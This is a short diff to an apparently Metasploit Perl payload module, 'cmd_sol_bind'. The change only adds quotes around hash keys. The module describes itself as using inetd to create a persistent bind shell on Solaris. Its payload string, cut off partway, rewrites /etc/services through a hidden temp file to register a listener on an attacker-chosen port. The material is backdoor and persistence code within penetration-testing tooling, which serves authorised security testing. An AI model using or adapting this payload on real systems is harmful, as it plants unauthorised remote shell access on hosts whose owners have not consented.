@@ -4,23 +4,23 @@ use base 'Msf::CommandPayload';
 
 my $info =
 {
-    Name         => 'cmd_sol_bind',
-    Version      => '1.0',
-    Description  => 'Use inetd to create a persistent bindshell',
-    Author       => 'H D Moore <hdm [at] metasploit.com> [Artistic License]',
-    Arch         => [  ],
-    Priv         => 0,
-    OS           => [ 'solaris' ],
-    Keys         => ['cmd'], 
-    Multistage   => 0,
-    Type         => 'bind_shell',
-    Size         => '',
-    UserOpts     =>
+    'Name'         => 'cmd_sol_bind',
+    'Version'      => '1.0',
+    'Description'  => 'Use inetd to create a persistent bindshell',
+    'Author'       => 'H D Moore <hdm [at] metasploit.com> [Artistic License]',
+    'Arch'         => [  ],
+    'Priv'         => 0,
+    'OS'           => [ 'solaris' ],
+    'Keys'         => ['cmd'], 
+    'Multistage'   => 0,
+    'Type'         => 'bind_shell',
+    'Size'         => '',
+    'UserOpts'     =>
         {
             'LPORT' => [1, 'PORT', 'Listening port for bind shell'],
         },
         
-    CommandPayload =>
+    'CommandPayload' =>
     "grep -v msfbind /etc/services>/tmp/.msf_svcs;".
     "echo msfbind [>LPORT<]/tcp>>/tmp/.msf_svcs;".
     "cp /tmp/.msf_svcs /etc/services;".
